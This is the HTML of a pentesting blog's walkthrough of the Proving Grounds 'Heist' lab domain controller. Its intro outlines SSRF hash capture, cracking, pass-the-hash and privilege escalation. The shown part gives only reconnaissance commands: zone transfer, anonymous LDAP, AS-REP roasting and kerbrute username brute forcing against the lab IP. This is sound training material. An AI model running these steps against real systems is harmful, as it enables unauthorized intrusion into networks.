in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.44705882352941 0.4"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.098039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.66274509803922"></feFuncG><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><div class="ct-drawer-canvas">
+		<div id="search-modal" class="ct-panel" data-behaviour="modal">
+			<div class="ct-panel-actions">
+				<button class="ct-toggle-close" data-type="type-1" aria-label="Close search modal">
+					<svg class="ct-icon" width="12" height="12" viewBox="0 0 15 15">
+						<path d="M1 15a1 1 0 01-.71-.29 1 1 0 010-1.41l5.8-5.8-5.8-5.8A1 1 0 011.7.29l5.8 5.8 5.8-5.8a1 1 0 011.41 1.41l-5.8 5.8 5.8 5.8a1 1 0 01-1.41 1.41l-5.8-5.8-5.8 5.8A1 1 0 011 15z"></path>
+					</svg>
+				</button>
+			</div>
+
+			<div class="ct-panel-content">
+				
+
+<form role="search" method="get" class="search-form" action="https://juggernaut-sec.com" data-live-results="thumbs">
+
+	<input type="search" class="modal-field" placeholder="Search" value="" name="s" autocomplete="off" title="Search Input">
+
+	<button type="submit" class="search-submit" aria-label="Search button">
+		<svg class="ct-icon" aria-hidden="true" width="15" height="15" viewBox="0 0 15 15"><path d="M14.8,13.7L12,11c0.9-1.2,1.5-2.6,1.5-4.2c0-3.7-3-6.8-6.8-6.8S0,3,0,6.8s3,6.8,6.8,6.8c1.6,0,3.1-0.6,4.2-1.5l2.8,2.8c0.1,0.1,0.3,0.2,0.5,0.2s0.4-0.1,0.5-0.2C15.1,14.5,15.1,14,14.8,13.7z M1.5,6.8c0-2.9,2.4-5.2,5.2-5.2S12,3.9,12,6.8S9.6,12,6.8,12S1.5,9.6,1.5,6.8z"></path></svg>
+		<span data-loader="circles"><span></span><span></span><span></span></span>
+	</button>
+
+	
+			<input type="hidden" name="ct_post_type" value="post:page">
+	
+</form>
+
+
+			</div>
+		</div>
+
+		<div id="offcanvas" class="ct-panel ct-header" data-behaviour="right-side"><div class="ct-panel-inner">
+		<div class="ct-panel-actions">
+			<button class="ct-toggle-close" data-type="type-1" aria-label="Close drawer">
+				<svg class="ct-icon" width="12" height="12" viewBox="0 0 15 15">
+					<path d="M1 15a1 1 0 01-.71-.29 1 1 0 010-1.41l5.8-5.8-5.8-5.8A1 1 0 011.7.29l5.8 5.8 5.8-5.8a1 1 0 011.41 1.41l-5.8 5.8 5.8 5.8a1 1 0 01-1.41 1.41l-5.8-5.8-5.8 5.8A1 1 0 011 15z"></path>
+				</svg>
+			</button>
+		</div>
+		<div class="ct-panel-content" data-device="desktop"></div><div class="ct-panel-content" data-device="mobile">
+<nav class="mobile-menu has-submenu" data-id="mobile-menu" data-interaction="click" data-toggle-type="type-1" aria-label="Off Canvas Menu">
+	<ul id="menu-main-1" class=""><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-156"><a href="https://juggernaut-sec.com" class="ct-menu-link">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-149"><a href="https://juggernaut-sec.com/whoami/" class="ct-menu-link">whoami</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-146"><a href="https://juggernaut-sec.com/contact-me/" class="ct-menu-link">Contact Me</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-252"><a href="https://juggernaut-sec.com/courses/" class="ct-menu-link">Courses</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-96"><span class="ct-sub-menu-parent"><a href="https://juggernaut-sec.com/blog" class="ct-menu-link">Blog</a><button class="ct-toggle-dropdown-mobile" aria-label="Expand dropdown menu" aria-expanded="false"><svg class="ct-icon toggle-icon-1" width="15" height="15" viewBox="0 0 15 15"><path d="M3.9,5.1l3.6,3.6l3.6-3.6l1.4,0.7l-5,5l-5-5L3.9,5.1z"></path></svg></button></span>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-102"><a href="https://juggernaut-sec.com/category/walkthroughs/" class="ct-menu-link">Walkthroughs</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97"><a href="https://juggernaut-sec.com/category/active-directory-hacking/" class="ct-menu-link">Active Directory Hacking</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-98"><a href="https://juggernaut-sec.com/category/windows-privilege-escalation/" class="ct-menu-link">Windows Privilege Escalation</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99"><a href="https://juggernaut-sec.com/category/linux-privilege-escalation/" class="ct-menu-link">Linux Privilege Escalation</a></li>
+</ul>
+</li>
+</ul></nav>
+
+</div></div></div>
+	<a href="#main-container" class="ct-back-to-top ct-hidden-sm ct-show" data-shape="square" data-alignment="right" title="Go to top" aria-label="Go to top">
+
+		<svg class="ct-icon" width="15" height="15" viewBox="0 0 20 20"><path d="M18.1,9.4c-0.2,0.4-0.5,0.6-0.9,0.6h-3.7c0,0-0.6,8.7-0.9,9.1C12.2,19.6,11.1,20,10,20c-1,0-2.3-0.3-2.7-0.9C7,18.7,6.5,10,6.5,10H2.8c-0.4,0-0.7-0.2-1-0.6C1.7,9,1.7,8.6,1.9,8.3c2.8-4.1,7.2-8,7.4-8.1C9.5,0.1,9.8,0,10,0s0.5,0.1,0.6,0.2c0.2,0.1,4.6,3.9,7.4,8.1C18.2,8.7,18.3,9.1,18.1,9.4z"></path></svg>
+		
+	</a>
+
+	
+
+	
+	</div>
+<div id="main-container">
+	<header id="header" class="ct-header" data-id="type-1" itemscope="" itemtype="https://schema.org/WPHeader"><div data-device="desktop"><div data-row="middle" data-column-set="2"><div class="ct-container"><div data-column="start" data-placements="1"><div data-items="primary">
+<div class="site-branding" data-id="logo" data-logo="left" itemscope="itemscope" itemtype="https://schema.org/Organization">
+
+			<a href="https://juggernaut-sec.com/" class="site-logo-container" rel="home"><img src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-e1651862568382.png" class="default-logo" alt="Juggernaut Pentesting Blog" width="512" height="512"></a>	
+			<div class="site-title-container">
+							<span class="site-title " itemprop="name">
+					<a href="https://juggernaut-sec.com/" rel="home" itemprop="url">
+						Juggernaut Pentesting Academy					</a>
+				</span>
+			
+					</div>
+	  </div>
+
+</div></div><div data-column="end" data-placements="1"><div data-items="primary">
+<nav id="header-menu-1" class="header-menu-1" data-id="menu" data-interaction="hover" data-menu="type-1" data-dropdown="type-1:simple" data-responsive="yes" itemscope="" itemtype="https://schema.org/SiteNavigationElement" aria-label="Header Menu">
+
+	<ul id="menu-main" class="menu"><li id="menu-item-156" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-156"><a href="https://juggernaut-sec.com" class="ct-menu-link">Home</a></li>
+<li id="menu-item-149" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-149"><a href="https://juggernaut-sec.com/whoami/" class="ct-menu-link">whoami</a></li>
+<li id="menu-item-146" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-146"><a href="https://juggernaut-sec.com/contact-me/" class="ct-menu-link">Contact Me</a></li>
+<li id="menu-item-252" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-252"><a href="https://juggernaut-sec.com/courses/" class="ct-menu-link">Courses</a></li>
+<li id="menu-item-96" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-96 animated-submenu" data-submenu="right"><a href="https://juggernaut-sec.com/blog" class="ct-menu-link">Blog<span class="ct-toggle-dropdown-desktop"><svg class="ct-icon" width="8" height="8" viewBox="0 0 15 15"><path d="M2.1,3.2l5.4,5.4l5.4-5.4L15,4.3l-7.5,7.5L0,4.3L2.1,3.2z"></path></svg></span></a><button class="ct-toggle-dropdown-desktop-ghost" aria-label="Expand dropdown menu" aria-expanded="false"></button>
+<ul class="sub-menu">
+	<li id="menu-item-102" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-102"><a href="https://juggernaut-sec.com/category/walkthroughs/" class="ct-menu-link">Walkthroughs</a></li>
+	<li id="menu-item-97" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97"><a href="https://juggernaut-sec.com/category/active-directory-hacking/" class="ct-menu-link">Active Directory Hacking</a></li>
+	<li id="menu-item-98" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-98"><a href="https://juggernaut-sec.com/category/windows-privilege-escalation/" class="ct-menu-link">Windows Privilege Escalation</a></li>
+	<li id="menu-item-99" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99"><a href="https://juggernaut-sec.com/category/linux-privilege-escalation/" class="ct-menu-link">Linux Privilege Escalation</a></li>
+</ul>
+</li>
+</ul></nav>
+
+
+<button data-toggle-panel="#search-modal" class="ct-header-search ct-toggle " aria-label="Open search form" data-label="left" data-id="search">
+
+	<span class="ct-label ct-hidden-sm ct-hidden-md ct-hidden-lg">Search</span>
+
+	<svg class="ct-icon" aria-hidden="true" width="15" height="15" viewBox="0 0 15 15"><path d="M14.8,13.7L12,11c0.9-1.2,1.5-2.6,1.5-4.2c0-3.7-3-6.8-6.8-6.8S0,3,0,6.8s3,6.8,6.8,6.8c1.6,0,3.1-0.6,4.2-1.5l2.8,2.8c0.1,0.1,0.3,0.2,0.5,0.2s0.4-0.1,0.5-0.2C15.1,14.5,15.1,14,14.8,13.7z M1.5,6.8c0-2.9,2.4-5.2,5.2-5.2S12,3.9,12,6.8S9.6,12,6.8,12S1.5,9.6,1.5,6.8z"></path></svg></button>
+</div></div></div></div></div><div data-device="mobile"><div data-row="middle" data-column-set="2"><div class="ct-container"><div data-column="start" data-placements="1"><div data-items="primary">
+<div class="site-branding" data-id="logo" data-logo="left" itemscope="itemscope" itemtype="https://schema.org/Organization">
+
+			<a href="https://juggernaut-sec.com/" class="site-logo-container" rel="home"><img src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-e1651862568382.png" class="default-logo" alt="Juggernaut Pentesting Blog" width="512" height="512"></a>	
+			<div class="site-title-container">
+							<span class="site-title " itemprop="name">
+					<a href="https://juggernaut-sec.com/" rel="home" itemprop="url">
+						Juggernaut Pentesting Academy					</a>
+				</span>
+			
+					</div>
+	  </div>
+
+</div></div><div data-column="end" data-placements="1"><div data-items="primary">
+<button data-toggle-panel="#offcanvas" class="ct-header-trigger ct-toggle " data-design="solid" data-label="right" aria-label="Open off canvas" data-id="trigger">
+
+	<span class="ct-label ct-hidden-sm ct-hidden-md ct-hidden-lg">Menu</span>
+
+	<svg class="ct-icon" width="18" height="14" viewBox="0 0 18 14" aria-hidden="true" data-type="type-1">
+
+		<rect y="0.00" width="18" height="1.7" rx="1"></rect>
+		<rect y="6.15" width="18" height="1.7" rx="1"></rect>
+		<rect y="12.3" width="18" height="1.7" rx="1"></rect>
+	</svg>
+</button>
+</div></div></div></div></div></header>
+	<main id="main" class="site-main hfeed" itemscope="itemscope" itemtype="https://schema.org/CreativeWork">
+
+		
+	<div class="ct-container-full" data-content="normal" data-vertical-spacing="top:bottom">
+
+		
+		
+	<article id="post-1771" class="post-1771 post type-post status-publish format-standard has-post-thumbnail hentry category-active-directory category-walkthroughs tag-bloodhound tag-bloodhound-py tag-crackmapexec tag-evil-winrm tag-gmsa tag-gmsa-password tag-gmsapasswordreader-exe tag-hashcat tag-hesit tag-kerbrute tag-pass-the-hash tag-pg tag-pg-practice tag-proving-grounds tag-responder tag-seclogon tag-serestore tag-serestoreabuse-exe tag-serestoreprivilege tag-service-account tag-ssrf tag-svc_apache tag-utilman-exe tag-visual-studio tag-walkthrough">
+
+		
+<div class="hero-section" data-type="type-1">
+	<header class="entry-header">
+		<h1 class="page-title" title="Proving Grounds – Heist" itemprop="headline">Proving Grounds – Heist</h1><ul class="entry-meta" data-type="simple:slash"><li class="meta-author" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><a href="https://juggernaut-sec.com/author/thecyberjuggernaut/" tabindex="-1" class="ct-image-container-static ct-lazy-loaded"><img data-ct-lazy="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-e1651862568382.png" data-object-fit="~" style="height:25px" alt="The Cyber Juggernaut" data-ll-status="loaded" class="entered loaded" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-e1651862568382.png" width="25" height="25"><noscript><img src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-e1651862568382.png" data-object-fit="~" width="25" height="25" style="height:25px" alt="The Cyber Juggernaut" ></noscript></a><a class="ct-meta-element-author" href="https://juggernaut-sec.com/author/thecyberjuggernaut/" title="Posts by The Cyber Juggernaut" rel="author" itemprop="url"><span itemprop="name">The Cyber Juggernaut</span></a></li><li class="meta-date" itemprop="datePublished"><time class="ct-meta-element-date" datetime="2022-05-14T19:54:35+00:00">May 14, 2022</time></li><li class="meta-categories" data-type="simple"><a href="https://juggernaut-sec.com/category/walkthroughs/active-directory/" rel="tag" class="ct-term-283">Active Directory</a>, <a href="https://juggernaut-sec.com/category/walkthroughs/" rel="tag" class="ct-term-23">Walkthroughs</a></li><li class="meta-comments"><a href="https://juggernaut-sec.com/proving-grounds-heist/#comments">1 Comment</a></li></ul>	</header>
+</div>
+
+		
+		
+		<div class="entry-content">
+			<div id="ez-toc-container" class="ez-toc-v2_0_31_1 counter-hierarchy counter-decimal">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">Table of Contents</p>
+<span class="ez-toc-title-toggle"><a href="#" class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle" style="display: inline;"><label for="item" aria-label="Table of Content"><i class="ez-toc-glyphicon ez-toc-icon-toggle"></i></label><input type="checkbox" id="item"></a></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1" style="display: none;"><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-1" href="#Initial_Scanning" title="Initial Scanning">Initial Scanning</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-2" href="#Enumeration_and_Initial_Exploit" title="Enumeration and Initial Exploit">Enumeration and Initial Exploit</a><ul class="ez-toc-list-level-2"><li class="ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-3" href="#Review_of_Open_Ports" title="Review of Open Ports">Review of Open Ports</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-4" href="#Enumerating_Services_Specific_to_a_Domain_Controller" title="Enumerating Services Specific to a Domain Controller">Enumerating Services Specific to a Domain Controller</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-5" href="#Web_Server_Enumeration_and_Exploiting_an_SSRF_Vulnerability_Using_Responder" title="Web Server Enumeration and Exploiting an SSRF Vulnerability Using Responder">Web Server Enumeration and Exploiting an SSRF Vulnerability Using Responder</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-6" href="#Cracking_the_NetNTLMv2_Hash_with_Hashcat" title="Cracking the NetNTLMv2 Hash with Hashcat">Cracking the NetNTLMv2 Hash with Hashcat</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-7" href="#Testing_Access_with_the_Cracked_Password_Using_Crackmapexec" title="Testing Access with the Cracked Password Using Crackmapexec">Testing Access with the Cracked Password Using Crackmapexec</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-8" href="#Gaining_a_Foothold_Through_the_WinRM_Service_Using_Evil-Winrm" title="Gaining a Foothold Through the WinRM Service Using Evil-Winrm">Gaining a Foothold Through the WinRM Service Using Evil-Winrm</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-9" href="#Post_Exploitation_Enumeration_and_Privilege_Escalation_to_svc_apache" title="Post Exploitation Enumeration and Privilege Escalation to svc_apache$">Post Exploitation Enumeration and Privilege Escalation to svc_apache$</a><ul class="ez-toc-list-level-2"><li class="ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-10" href="#Local_Enumeration_Using_Manual_Technqiues_PowerUpps1_and_WinPeas" title="Local Enumeration Using Manual Technqiues, PowerUp.ps1, and WinPeas">Local Enumeration Using Manual Technqiues, PowerUp.ps1, and WinPeas</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-11" href="#Domain_Enumeration_Using_Bloodhoundpy_and_PowerViewps1" title=" Domain Enumeration Using Bloodhound.py and PowerView.ps1"> Domain Enumeration Using Bloodhound.py and PowerView.ps1</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-12" href="#Extracting_the_gMSA_Password_Using_GMSAPasswordReaderexe_and_Getting_a_Shell_as_svc_apache" title="Extracting the gMSA Password Using GMSAPasswordReader.exe and Getting a Shell as svc_apache">Extracting the gMSA Password Using GMSAPasswordReader.exe and Getting a Shell as svc_apache</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-13" href="#Post_Exploitation_Enumeration_Part_2_and_Privilege_Escalation_to_SYSTEM" title="Post Exploitation Enumeration Part 2 and Privilege Escalation to SYSTEM">Post Exploitation Enumeration Part 2 and Privilege Escalation to SYSTEM</a><ul class="ez-toc-list-level-2"><li class="ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-14" href="#Discovering_svc_apache_has_SeRestorePrivileges_and_Finding_how_to_Exploit_Seclogon_for_Privilege_Escalation" title="Discovering svc_apache has SeRestorePrivileges and Finding how to Exploit Seclogon for Privilege Escalation">Discovering svc_apache has SeRestorePrivileges and Finding how to Exploit Seclogon for Privilege Escalation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-15" href="#Compiling_SeRestoreAbuseexe_from_an_SLN_Using_Visual_Studio" title="Compiling SeRestoreAbuse.exe from an SLN Using Visual Studio">Compiling SeRestoreAbuse.exe from an SLN Using Visual Studio</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-16" href="#Getting_a_SYSTEM_shell_with_SeRestoreAbuseexe_and_Netcat" title="Getting a SYSTEM shell with SeRestoreAbuse.exe and Netcat">Getting a SYSTEM shell with SeRestoreAbuse.exe and Netcat</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-17" href="#Flags" title="Flags">Flags</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-18" href="#BONUS_-_Privilege_Escalation_via_GUI_Method_utilmanexe" title="BONUS – Privilege Escalation via GUI Method (utilman.exe)">BONUS – Privilege Escalation via GUI Method (utilman.exe)</a></li><li class="ez-toc-page-1 ez-toc-heading-level-1"><a class="ez-toc-link ez-toc-heading-19" href="#Want_to_stay_up_to_date_with_the_latest_hacks" title="Want to stay up to date with the latest hacks?">Want to stay up to date with the latest hacks?</a></li></ul></nav></div>
+
+<p>In this Walkthrough, we will be hacking the machine Heist from Proving Grounds Practice. </p>
+
+
+
+<p>We will begin by finding an SSRF vulnerability on a web server that the target is hosting on port 8080. To exploit the SSRF vulnerability, we will use Responder and then create a request to a non existent resource to capture the user who owns the web server’s NetNTLMv2 hash.</p>
+
+
+
+<p>From there, we will crack the hash with hashcat and then find that the user has access to the system through WinRM. After gaining a foothold using evil-winrm, we will enumerate a service account and then find that our current user has the ability to read the gMSA Password for that service account. </p>
+
+
+
+<p>Finally, we will login as the service account with a pass-the-hash attack and then escalate our privileges to SYSTEM utilizing the SeRestorePrivilege.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>Disclaimer: I know it’s frowned upon to do PG Practice walkthroughs; however we are going to use some different techniques to create a learning opportunity beyond what the official walkthrough provides for the machine.</p></blockquote>
+
+
+
+<h1><span class="ez-toc-section" id="Initial_Scanning"></span><strong>Initial Scanning</strong><span class="ez-toc-section-end"></span></h1>
+
+
+
+<p><strong>— nmap TCP full —</strong></p>
+
+
+
+<figure class="wp-block-image size-full"><img src="https://juggernaut-sec.com/wp-content/uploads/2022/05/24f6ee045b272a64d2dbe13ab7688daf.png" alt="" class="wp-image-1775" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/24f6ee045b272a64d2dbe13ab7688daf.png 941w, https://juggernaut-sec.com/wp-content/uploads/2022/05/24f6ee045b272a64d2dbe13ab7688daf-300x249.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/24f6ee045b272a64d2dbe13ab7688daf-768x637.png 768w" sizes="(max-width: 941px) 100vw, 941px" width="941" height="781"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/00698d351ea9f7299f213e777635e8e3.png" alt="" class="wp-image-1776" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/00698d351ea9f7299f213e777635e8e3.png 427w, https://juggernaut-sec.com/wp-content/uploads/2022/05/00698d351ea9f7299f213e777635e8e3-300x105.png 300w" sizes="(max-width: 427px) 100vw, 427px" width="427" height="150"></figure>
+
+
+
+<p><strong>— nmap UDP top 1000 —</strong></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/f6e240323a6fcae5e7d57cdd1b8daffe.png" alt="" class="wp-image-1777" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/f6e240323a6fcae5e7d57cdd1b8daffe.png 937w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f6e240323a6fcae5e7d57cdd1b8daffe-300x158.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f6e240323a6fcae5e7d57cdd1b8daffe-768x405.png 768w" sizes="(max-width: 937px) 100vw, 937px" width="937" height="494"></figure>
+
+
+
+<p><strong>— gobuster 8080 —</strong></p>
+
+
+
+<p>No results.</p>
+
+
+
+<p><strong>— nikto 8080 —</strong></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/7bb6e3e7ad694a8aedcd884b3366ed11.png" alt="" class="wp-image-1778" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/7bb6e3e7ad694a8aedcd884b3366ed11.png 937w, https://juggernaut-sec.com/wp-content/uploads/2022/05/7bb6e3e7ad694a8aedcd884b3366ed11-300x106.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/7bb6e3e7ad694a8aedcd884b3366ed11-768x272.png 768w" sizes="(max-width: 937px) 100vw, 937px" width="937" height="332"></figure>
+
+
+
+<h1><span class="ez-toc-section" id="Enumeration_and_Initial_Exploit"></span><strong>Enumeration and Initial Exploit</strong><span class="ez-toc-section-end"></span></h1>
+
+
+
+<h2><span class="ez-toc-section" id="Review_of_Open_Ports"></span><strong>Review of Open Ports</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Lots of interesting TCP ports open and it was observed this is an AD machine, and even more specifically, a Domain Controller (DC)!</p>
+
+
+
+<ul><li>Port 53 is open and is hosting a DNS service over TCP – <strong>version: Simple DNS Plus (version number unknown at this time)</strong></li><li>Port 88 is open and is hosting the kerberos service.</li><li>Ports 135 / 139 / 445 are open and are hosting the RPC / NetBIOS / SMB share services respecitively.</li><li>Ports 389 / 3268 and 636 / 3269 are hosting the LDAP/S services respectiveley</li><li>Port 464 is hosting an unknown service kpasswd5?</li><li>Ports 593 and 49xxx are hosting the high port RPC services.</li><li>Port 5985 is hosting the WinRM service, which will be good if credentials are found.</li><li>Port 8080 is open and is hosting an HTTP server – <strong>Super Secure Web Browser – Werkzeug httpd 2.0.1 (Python 3.9.0)</strong></li><li>Port 9389 is hosting the .NET Message Framing service.</li></ul>
+
+
+
+<p>From the nmap scan we can see this is a Domain Controller with a hostname of <strong>DC01</strong> and is the DC for domain <strong>heist.offsec</strong>.</p>
+
+
+
+<h2><span class="ez-toc-section" id="Enumerating_Services_Specific_to_a_Domain_Controller"></span><strong>Enumerating Services Specific to a Domain Controller</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Enumeration will begin by attempting to get a Zone Transfer from the DNS server. </p>
+
+
+
+<ul><li>Dig failed for me so I tried <strong>dnsenum</strong> but that too didn’t get a hit.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>dig @192.168.194.165 AXFR heist.offsec
+dnsenum 192.168.194.165</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/ec1c07c11fabfc077ca8e7343014a63b.png" alt="" class="wp-image-1779" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/ec1c07c11fabfc077ca8e7343014a63b.png 555w, https://juggernaut-sec.com/wp-content/uploads/2022/05/ec1c07c11fabfc077ca8e7343014a63b-300x211.png 300w" sizes="(max-width: 555px) 100vw, 555px" width="555" height="390"></figure>
+
+
+
+<p>Next, I attempted jump into the SMB share with an anonymous session.</p>
+
+
+
+<ul><li>Testing both smbclient and rpcclient to get NULL access was denied.</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/6047da926026c567159d4b9ed7bc8837.png" alt="" class="wp-image-1780" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/6047da926026c567159d4b9ed7bc8837.png 502w, https://juggernaut-sec.com/wp-content/uploads/2022/05/6047da926026c567159d4b9ed7bc8837-300x66.png 300w" sizes="(max-width: 502px) 100vw, 502px" width="502" height="111"></figure>
+
+
+
+<p>Moving on, I attempted to perform an LDAP search without supplying any credentials.</p>
+
+
+
+<ul><li>This did not work as it requires an authenticated session to dump info.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>ldapsearch -x -h 192.168.194.165 -b "dc=heist,dc=offsec"</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/1131d34b29319076dec39d4c05b9bcb0.png" alt="" class="wp-image-1782" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/1131d34b29319076dec39d4c05b9bcb0.png 654w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1131d34b29319076dec39d4c05b9bcb0-300x130.png 300w" sizes="(max-width: 654px) 100vw, 654px" width="654" height="283"></figure>
+
+
+
+<p>Looking for a quick win, I checked to see if I could enumerate any AS-REP roastable users that have pre-authentication disabled.</p>
+
+
+
+<ul><li>Testing without any username resulted in an error.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>GetNPUsers.py heist.offsec/ -dc-ip 192.168.194.165</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/aabe5e8209b21107352e22871bb50446.png" alt="" class="wp-image-1784" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/aabe5e8209b21107352e22871bb50446.png 932w, https://juggernaut-sec.com/wp-content/uploads/2022/05/aabe5e8209b21107352e22871bb50446-300x36.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/aabe5e8209b21107352e22871bb50446-768x92.png 768w" sizes="(max-width: 932px) 100vw, 932px" width="932" height="112"></figure>
+
+
+
+<p>Without any usernames to work with, I attempted to brute force some by running kerbrute on a list of names in <strong>names.txt</strong> and let it run while I continue enumerating.</p>
+
+
+
+<ul><li>The brute force attempt finished and did not find any valid usernames.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip 192.168.194.165</code></pre>
+
+
+
